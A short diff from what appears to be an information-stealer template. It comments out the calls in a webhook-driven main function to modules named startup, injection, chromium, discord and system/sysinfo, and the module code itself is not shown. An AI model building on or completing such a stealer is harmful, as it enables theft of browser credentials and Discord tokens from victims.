@@ -15,12 +15,12 @@ __ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode
 
 def main(webhook: str) -> None:
     funcs = [
-        debug,
-        startup,
-        injection,
-        chromium,
-        discord,
-        system,
+        # debug,
+        # startup,
+        # injection,
+        # chromium,
+        # discord,
+        # sysinfo,
     ]
 
     for func in funcs:
